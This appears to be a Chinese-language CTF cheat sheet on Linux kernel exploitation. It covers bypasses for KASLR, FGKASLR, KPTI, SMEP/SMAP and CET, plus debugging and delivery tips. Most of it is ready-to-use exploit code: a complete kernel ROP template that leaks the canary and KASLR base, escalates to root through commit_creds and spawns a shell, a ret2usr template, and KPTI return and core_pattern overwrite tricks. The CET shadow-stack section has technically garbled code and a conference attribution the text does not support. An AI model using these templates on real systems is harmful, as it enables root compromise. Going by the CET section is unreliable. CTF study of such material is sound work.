# CTF Pwn - 内核保护绕过

## Table of Contents
- [KASLR 与 FGKASLR 绕过](#kaslr-与-fgkaslr-绕过)
  - [通过栈泄漏绕过 KASLR（hxp CTF 2020）](#通过栈泄漏绕过-kaslrhxp-ctf-2020)
  - [FGKASLR 绕过（hxp CTF 2020）](#fgkaslr-绕过hxp-ctf-2020)
- [KPTI 绕过方法](#kpti-绕过方法)
  - [方法 1：swapgs_restore 跳板](#方法-1swapgs_restore-跳板)
  - [方法 2：信号处理器（SIGSEGV）](#方法-2信号处理器sigsegv)
  - [方法 3：通过 ROP 写 modprobe_path](#方法-3通过-rop-写-modprobe_path)
  - [方法 4：通过 ROP 写 core_pattern](#方法-4通过-rop-写-core_pattern)
- [CET 影子栈（SHSTK）与 IBT —— 信号帧绕过（Wolv / IERAE 2024）](#cet-影子栈shstk与-ibt--信号帧绕过wolv--ierae-2024)
- [SMEP / SMAP 绕过](#smep--smap-绕过)
- [KPTI / SMEP / SMAP 速查](#kpti--smep--smap-速查)
- [GDB 调试内核模块](#gdb-调试内核模块)
- [initramfs 与 virtio-9p 工作流](#initramfs-与-virtio-9p-工作流)
- [在没有 CONFIG_KALLSYMS_ALL 的情况下找符号偏移](#在没有-config_kallsyms_all-的情况下找符号偏移)
- [利用模板](#利用模板)
  - [完整内核 ROP 模板（SMEP + KPTI）](#完整内核-rop-模板smep--kpti)
  - [ret2usr 模板（无 SMEP/SMAP）](#ret2usr-模板无-smepsmap)
- [利用投放](#利用投放)

---

<a id="kaslr-and-fgkaslr-bypass"></a>
## KASLR 与 FGKASLR 绕过

<a id="kaslr-bypass-via-stack-leak-hxp-ctf-2020"></a>
### 通过栈泄漏绕过 KASLR（hxp CTF 2020）

从栈上泄漏一个内核代码指针，计算出 KASLR（Kernel Address Space Layout Randomization）偏移：

```c
// Kernel base without KASLR
#define KERNEL_BASE 0xffffffff81000000

unsigned long leak[40];
read(fd, leak, sizeof(leak));  // oversized read from vulnerable module

// leak[38] contains a randomized kernel text pointer
unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - KERNEL_BASE;

// Apply offset to all addresses
unsigned long commit_creds_kaslr = commit_creds + kaslr_offset;
unsigned long pop_rdi_ret_kaslr = pop_rdi_ret + kaslr_offset;
```

**其他 KASLR 泄漏来源：**
- `/proc/kallsyms`（若 `kptr_restrict != 1`）
- `dmesg`（若 `dmesg_restrict != 1`）
- 内核 oops 消息（若 oops 未触发 panic）
- 通过 UAF 读取含代码指针的已释放内核对象
- `modprobe_path` 只有 1 字节熵 —— 配合 AAW 可暴力破解

<a id="fgkaslr-bypass-hxp-ctf-2020"></a>
### FGKASLR 绕过（hxp CTF 2020）

FGKASLR（Function Granular KASLR）会对单个函数做随机化，但早期的 `.text` 段（大约到偏移 `0x400dc6` 为止）相对内核基址仍保持固定偏移。这一段里的 gadget 可以放心使用。

**方法 1：只用未受影响的 `.text` gadget**

```bash
# Find gadgets only in the non-randomized range
ropr --no-uniq -R "^pop rdi; ret;|^swapgs" ./vmlinux | \
    awk -F: '{if (strtonum("0x"$1) < 0xffffffff81400dc6) print}'
```

`swapgs_restore_regs_and_return_to_usermode` 位于未受影响的 `.text` 段，只需 KASLR 基址偏移即可使用。

**方法 2：通过 `__ksymtab` 解析被随机化的函数**

`__ksymtab` 表项使用相对偏移而非绝对地址，且 `__ksymtab` 段本身不受 FG-KASLR 随机化：

```c
// struct kernel_symbol { int value_offset; int name_offset; int namespace_offset; };
// Real address = &ksymtab_entry + entry.value_offset

unsigned long ksymtab_prepare_kernel_cred = 0xffffffff81f8d4fc; // from /proc/kallsyms
unsigned long ksymtab_commit_creds = 0xffffffff81f87d90;

// ROP chain to read ksymtab entry and compute real address:
// 1. Load ksymtab address into rax
payload[off++] = pop_rax_ret + kaslr_offset;
payload[off++] = ksymtab_prepare_kernel_cred + kaslr_offset;
// 2. Read 4-byte relative offset: mov eax, [rax]
payload[off++] = mov_eax_deref_rax_pop1_ret + kaslr_offset;
payload[off++] = 0x0;
// 3. Return to userland to compute: real_addr = ksymtab_addr + kaslr_offset + offset
payload[off++] = kpti_trampoline + kaslr_offset + 22;
payload[off++] = 0; payload[off++] = 0;
payload[off++] = (unsigned long)resolve_and_continue;
// ...

void resolve_and_continue() {
    // eax contains the relative offset read from ksymtab
    unsigned long resolved = ksymtab_prepare_kernel_cred + kaslr_offset + fetched_offset;
    // Now use resolved address in next ROP stage
}
```

**关键洞察：** FG-KASLR 要求多阶段利用：先返回用户态，从 `__ksymtab` 偏移算出真实地址，再带着第二段 ROP 链、使用已解析的函数地址重新进入内核。

---

<a id="kpti-bypass-methods"></a>
## KPTI 绕过方法

KPTI（Kernel Page Table Isolation）把内核页表与用户页表隔离。简单的 `swapgs; iretq` 会失败，因为用户页表没有被恢复。共四种绕过思路：

<a id="method-1-swapgs_restore-trampoline"></a>
### 方法 1：swapgs_restore 跳板

内核函数 `swapgs_restore_regs_and_return_to_usermode` 完整处理了 KPTI 返回序列。跳到偏移 +22 处可跳过寄存器恢复的前导代码，直接落在 CR3 切换 + `swapgs` + `iretq` 序列上：

```c
// Symbol from /proc/kallsyms or vmlinux
unsigned long kpti_trampoline = 0xffffffff81200f10;

// In ROP chain, after commit_creds:
payload[off++] = kpti_trampoline + 22;  // skip to mov rdi,rsp; ... swapgs; iretq
payload[off++] = 0x0;                    // padding (popped by trampoline)
payload[off++] = 0x0;                    // padding
payload[off++] = user_rip;
payload[off++] = user_cs;
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;
```

**关键洞察：** +22 偏移跳过函数的寄存器弹出/恢复序列，直接进入它切换 CR3、执行 `swapgs` 与 `iretq` 的位置。该偏移可能随内核版本变化 —— 请反汇编该函数确认。

<a id="method-2-signal-handler-sigsegv"></a>
### 方法 2：信号处理器（SIGSEGV）

在利用前注册 SIGSEGV 处理器。当 `iretq` 在未经 KPTI 处理的情况下返回时，缺页会触发 SIGSEGV，处理器捕获后弹出 shell：

```c
#include <signal.h>

void spawn_shell() {
    if (getuid() == 0) system("/bin/sh");
}

// Before exploit:
struct sigaction sa;
sa.sa_handler = spawn_shell;
sigemptyset(&sa.sa_mask);
sa.sa_flags = 0;
sigaction(SIGSEGV, &sa, NULL);
```

ROP 链仍然调用 `commit_creds(prepare_kernel_cred(0))` 并执行 `swapgs; iretq` 回到用户态。尽管因页表错误导致返回时出错，凭据已经提交完成。SIGSEGV 处理器会以 root 权限运行。

<a id="method-3-modprobe_path-via-rop"></a>
### 方法 3：通过 ROP 写 modprobe_path

不返回用户态，改用 `pop rax; pop rdi; mov [rdi], rax; ret` 系列 gadget 直接在内核 ROP 链里覆写 `modprobe_path`。无需任何 KPTI 处理 —— 写操作完全在内核上下文完成。

完整技术、触发序列与 ROP payload 见 [kernel.md - modprobe_path Overwrite](kernel.md#modprobe_path-覆写)。

<a id="method-4-core_pattern-via-rop"></a>
### 方法 4：通过 ROP 写 core_pattern

与第 3 种方法类似，但把 `core_pattern` 覆写为管道命令（例如 `"|/evil"`）。任何进程崩溃时，内核都会以 root 执行该管道程序。

完整技术与 `core_pattern` 地址的查找方式见 [kernel.md - core_pattern Overwrite](kernel.md#core_pattern-覆写)。

---

<a id="cet-shadow-stack-shstk-and-ibt--signal-frame-bypass-wolv--ierae-2024"></a>
## CET 影子栈（SHSTK）与 IBT —— 信号帧绕过（Wolv / IERAE 2024）

**保护机制：**
- **SHSTK（Shadow Stack）：** 位于 `SSP`（shadow stack pointer）的硬件影子栈 —— 每次 `CALL` 都会把返回地址同时压入普通栈与影子栈；`RET` 时校验二者一致。内核通过 `WRSS`/`WRUSS` 与 `MSR_IA32_PL0_SSP` 实施。
- **IBT（Indirect Branch Tracking）：** 间接调用/跳转必须落在 `ENDBR64` 上。

**信号帧为何能绕过 SHSTK：** 在 `sigreturn` / `sigaltstack` 时，内核会从信号帧的 `xsave` 区域（`struct sigcontext` + `xsaves`）**恢复**用户线程的影子栈指针。该帧由用户态控制，攻击者因此可以把 `SSP` 设成自己控制的影子栈，里面预置好 ROP 返回地址。

**Wolv / IERAE 2024 模式（用于开启 CET 的 Pwn2Own / CTF 内核题）：**

```c
// 1. Prepare alt signal stack that is also a valid shadow stack
void *shstk_mem = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE,
                       MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0);
unsigned long ssp = (unsigned long)shstk_mem + 0x2000 - 8;

 // 2. Mark it as shadow stack (requires CET arch_prctl)
arch_prctl(ARCH_SHSTK_ENABLE, ...); // ARCH_SHSTK_ENABLE = 0x5001; or kernel auto-marks sigaltstack
arch_prctl(ARCH_CET_ALLOC_SHSTK, &ssp);

// 3. Push attacker ROP addresses onto shadow stack (must mirror normal stack)
*(unsigned long *)ssp = (unsigned long)pop_rdi_ret;
*(unsigned long *)(ssp - 8) = 0;
*(unsigned long *)(ssp - 16) = (unsigned long)prepare_kernel_cred;

// 4. Raise signal with controlled sigframe that restores SSP to ssp
struct sigaction sa = { .sa_sigaction = handler, .sa_flags = SA_SIGINFO | SA_ONSTACK };
sigaltstack(&(stack_t){ .ss_sp = shstk_mem, .ss_size = 0x2000, .ss_flags = 0 }, NULL);
sigaction(SIGUSR1, &sa, NULL);

// handler builds fake sigcontext at its stack:
void handler(int sig, siginfo_t *info, void *ucontext) {
    ucontext_t *uc = (ucontext_t *)ucontext;
    // Overwrite SSP in the saved xsave area that sigreturn will restore
    // On x86-64 cet, SSP is at uc->uc_mcontext.__ssp (or xsaves offset 0x1f8)
    uc->uc_mcontext.__ssp = ssp - 16; // point to our fake shadow stack
    // Also set normal RSP/RIP for the rop chain
    uc->uc_mcontext.gregs[REG_RSP] = (unsigned long)rop_chain;
    uc->uc_mcontext.gregs[REG_RIP] = (unsigned long)pop_rdi_ret;
}

// 5. Trigger sigreturn — kernel does WRSS to restore SSP from uc->uc_mcontext.__ssp
raise(SIGUSR1);
// → sigreturn restores both normal stack and shadow stack to attacker values
// → RET now succeeds because shadow stack matches normal stack
```

**更简单的变体 —— 不调用 `arch_prctl`、直接用 `sigreturn` ROP：**
```python
from pwn import *

# If the exploit already has an arbitrary write to set up a fake signal frame on stack:
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret
frame.rsp = normal_rop_addr
# NOTE: pwntools SigreturnFrame has no ssp field. For CET shadow-stack control,
# build the raw frame then patch the SSP slot in the xsave area manually, and
# push a matching shadow-stack ROP pivot so RET pairs with the restored SSP:
raw = bytearray(bytes(frame))
# SSP lives in the signal frame's shadow-stack area (bytes 0x1e8-0x200 on
# CET-aware kernels); overwrite it so the kernel restores a valid SSP on sigreturn
ssp_offset = 0x1e8
raw[ssp_offset:ssp_offset + 8] = p64(fake_shstk_addr)
# Mirror the normal-stack ROP chain onto the fake shadow stack so each RET
# finds the same return address on both stacks
fake_shstk = flat([pop_rdi_ret, 0, prepare_kernel_cred])
```

**关键洞察：**
- 只要攻击者能触发信号，CET 影子栈就*不是*障碍 —— `sigreturn` 本身就是一条特权 `WRSS` gadget，会从用户态可控内存恢复 `SSP`。
- IBT 会随之一并被绕过：信号处理器返回走的是 `IRET` 而非间接 `JMP`，因此不检查 `ENDBR64`。一旦 `SSP` 可控，标准 kROP 即可工作。
- 若内核不支持 `ARCH_CET_ALLOC_SHSTK`，攻击者可复用已有的影子栈映射，用先前的写原语直接改写其内容，再通过信号帧按 `SHSTK` 偏移完成 `SSP` 枢轴。
- 检测：`cat /proc/cpuinfo | grep cet`，以及 `rdmsr 0x6a2`（IA32_PL0_SSP）或 `arch_prctl(ARCH_CET_STATUS)` —— 若 CET 开启，任何 RIP 劫持都必须配合影子栈控制。

**参考：** Wolv / IERAE — *Bypassing Intel CET with Signal Frames*（2024），Black Hat Asia 2024；内核补丁 `x86/cet: handle signal shadow stack`。

<a id="smep--smap-bypass"></a>
## SMEP / SMAP 绕过

**SMEP（Supervisor Mode Execution Prevention）：** 阻止内核态执行用户页。
- **绕过：** 使用内核 ROP（kROP）链 —— 所有 gadget 均来自内核 `.text`。见 [kernel.md - Kernel ROP](kernel.md#使用-prepare_kernel_cred--commit_creds-的内核-rop)。

**SMAP（Supervisor Mode Access Prevention）：** 阻止内核态访问用户内存。
- **绕过：** 使用常驻内核堆的 kROP 链（所有数据都在内核堆上），或用 `stac`/`clac` gadget 临时关闭 SMAP。

**直接改 CR4（老内核）：** 写 CR4 清掉 SMEP/SMAP 位。现代内核因 `native_write_cr4()` 固定了这些位而失效。

---

<a id="kpti--smep--smap-quick-reference"></a>
## KPTI / SMEP / SMAP 速查

| Protection | Blocks | Bypass |
|-----------|--------|--------|
| SMEP | Executing userland pages from kernel | kROP (kernel ROP chain) — see [kernel.md](kernel.md#使用-prepare_kernel_cred--commit_creds-的内核-rop) |
| SMAP | Accessing userland memory from kernel | kROP with heap-resident chain, `stac`/`clac` gadgets |
| No SMEP/SMAP | (nothing) | [ret2usr](kernel.md#ret2usr无-smepsmap) — directly call userland privesc function |
| KPTI | Kernel page table isolation | [Trampoline](#方法-1swapgs_restore-跳板), [signal handler](#方法-2信号处理器sigsegv), [modprobe_path](#方法-3通过-rop-写-modprobe_path), [core_pattern](#方法-4通过-rop-写-core_pattern) |

带代码的详细绕过技术见 [KPTI 绕过方法](#kpti-绕过方法)。

---

<a id="gdb-kernel-module-debugging"></a>
## GDB 调试内核模块

在 GDB 中加载漏洞内核模块的符号，实现源码级调试：

```bash
# 1. Find module load address (as root inside QEMU)
cat /proc/modules
# vuln 16384 0 - Live 0xffffffffc0000000 (O)

# 2. In GDB, load module symbols at that address
(gdb) target remote localhost:1234
(gdb) add-symbol-file vuln.ko 0xffffffffc0000000
(gdb) b swrite            # breakpoint on module function
(gdb) c

# 3. Inspect stack after breakpoint hit
(gdb) x/20xg $rsp-0x90    # examine stack buffer
(gdb) search "AAAAAAAA"   # find buffer location (pwndbg)
```

**注意：** 读取真实地址需要 root 才能看 `/proc/modules` 的内容。非 root 用户看到的是清零的地址。调试时可修改 `/init` 保持 root。

---

<a id="initramfs-and-virtio-9p-workflow"></a>
## initramfs 与 virtio-9p 工作流

**通过 virtio-9p 共享目录** —— 在宿主机与 QEMU 之间传递利用程序，无需重建 initramfs：
```bash
# Add to QEMU launch script:
-fsdev local,security_model=passthrough,id=fsdev0,path=./share \
-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare

# Inside QEMU guest (add to /init or run manually):
mkdir -p /home/ctf && mount -t 9p -o trans=virtio,version=9p2000.L hostshare /home/ctf

# On host, compile exploit into shared directory:
gcc exploit.c -static -o ./share/exploit
```

**解包并修改 initramfs：**
```bash
# Extract
mkdir initramfs && cd initramfs
gzip -dc ../initramfs.cpio.gz | cpio -idmv

# Modify /init for debugging (get root shell instead of unprivileged user)
# Comment out: exec su -l ctf
# Add: /bin/sh

# Rebuild
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
```

**调试时对 `/init` 的关键修改：**
- 注释掉 `exec su -l ctf`（或类似行）以保留 root 权限
- 注释掉 `echo 1 > /proc/sys/kernel/kptr_restrict` 以便查看 `/proc/kallsyms`
- 注释掉 `echo 1 > /proc/sys/kernel/dmesg_restrict` 以便查看 dmesg
- 注释掉 `chmod 400 /proc/kallsyms` 以便读取符号地址

---

<a id="finding-symbol-offsets-without-config_kallsyms_all"></a>
## 在没有 CONFIG_KALLSYMS_ALL 的情况下找符号偏移

`/proc/kallsyms` 默认只显示 `.text` 符号。`modprobe_path`、`core_pattern` 这类数据符号需要 `CONFIG_KALLSYMS_ALL=y` 才会出现。

**查找 modprobe_path：**

```bash
# 1. Get call_usermodehelper_setup address (always in /proc/kallsyms)
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. In GDB, set breakpoint and trigger
hb *0xffffffff810c8c80
# Trigger: echo -ne '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x

# 3. Check first argument (RDI = modprobe_path)
(gdb) p/x $rdi
# 0xffffffff8265ff00
(gdb) x/s $rdi
# "/sbin/modprobe"
```

**查找 core_pattern：**

```bash
# 1. Set breakpoint on override_creds (called by do_coredump)
# 2. Crash a process: gcc -static -o crash -xc - <<< 'int main(){((void(*)())0)();}'
# 3. After override_creds returns, disassemble — look for data address in movzx
```

---

<a id="exploit-templates"></a>
## 利用模板

<a id="full-kernel-rop-template-smep--kpti"></a>
### 完整内核 ROP 模板（SMEP + KPTI）

开启 SMEP 与 KPTI 时针对内核栈溢出的完整利用：

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

// Addresses from vmlinux (apply KASLR offset if needed)
unsigned long prepare_kernel_cred;
unsigned long commit_creds;
unsigned long pop_rdi_ret;
unsigned long mov_rdi_rax_pop1_ret;
unsigned long kpti_trampoline;

// Userland state
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_userland_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs;"
        "mov %[ss], ss;"
        "mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        ".att_syntax;"
        : [cs] "=r"(user_cs), [ss] "=r"(user_ss),
          [sp] "=r"(user_sp), [rflags] "=r"(user_rflags));
    user_rip = (unsigned long)spawn_shell;
}

void spawn_shell() {
    if (getuid() == 0) {
        printf("[+] root!\n");
        system("/bin/sh");
    } else {
        printf("[-] privesc failed\n");
        exit(1);
    }
}

int main() {
    save_userland_state();
    int fd = open("/dev/hackme", O_RDWR);

    // Step 1: Leak canary + KASLR base
    unsigned long leak[40];
    read(fd, leak, sizeof(leak));
    unsigned long cookie = leak[16];
    unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - 0xffffffff81000000;

    // Step 2: Apply KASLR offset
    prepare_kernel_cred += kaslr_offset;
    commit_creds += kaslr_offset;
    pop_rdi_ret += kaslr_offset;
    mov_rdi_rax_pop1_ret += kaslr_offset;
    kpti_trampoline += kaslr_offset;

    // Step 3: Build ROP chain
    unsigned long payload[50];
    int off = 16;
    payload[off++] = cookie;
    payload[off++] = 0;  // rbx
    payload[off++] = 0;  // r12
    payload[off++] = 0;  // rbp

    // prepare_kernel_cred(0) → commit_creds(result)
    payload[off++] = pop_rdi_ret;
    payload[off++] = 0;
    payload[off++] = prepare_kernel_cred;
    payload[off++] = mov_rdi_rax_pop1_ret;
    payload[off++] = 0;  // pop rbx padding
    payload[off++] = commit_creds;

    // KPTI-safe return to userland
    payload[off++] = kpti_trampoline + 22;
    payload[off++] = 0;  // padding
    payload[off++] = 0;  // padding
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    write(fd, payload, sizeof(payload));
    return 0;
}
```

<a id="ret2usr-template-no-smepsmap"></a>
### ret2usr 模板（无 SMEP/SMAP）

```c
void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"
        "mov r15, %[user_ss];   push r15;"
        "mov r15, %[user_sp];   push r15;"
        "mov r15, %[user_rflags]; push r15;"
        "mov r15, %[user_cs];   push r15;"
        "mov r15, %[user_rip];  push r15;"
        "iretq;"
        ".att_syntax;"
        : : [prepare_kernel_cred] "r"(prepare_kernel_cred),
            [commit_creds] "r"(commit_creds),
            [user_ss] "r"(user_ss), [user_sp] "r"(user_sp),
            [user_rflags] "r"(user_rflags),
            [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
}
```

---

<a id="exploit-delivery"></a>
## 利用投放

内核利用通常是体积很大的静态二进制。远程投放时尽量减小体积：

```bash
# 1. Compile with musl-libc (much smaller than glibc)
musl-gcc -static -O2 -o exploit exploit.c

# 2. Strip symbols
strip exploit

# 3. Compress and encode for transfer
gzip exploit && base64 exploit.gz > exploit.b64

# 4. On target: decode and decompress
base64 -d exploit.b64 | gunzip > /tmp/exploit && chmod +x /tmp/exploit

# Optional: UPX compression (further reduces size)
upx --best exploit
```

**常见坑：** 若利用使用带文件路径的 `setxattr()`，务必确认该文件在远程环境存在。本地路径（`/tmp/exploit`）可能与远程路径（`/home/user/exploit`）不同。
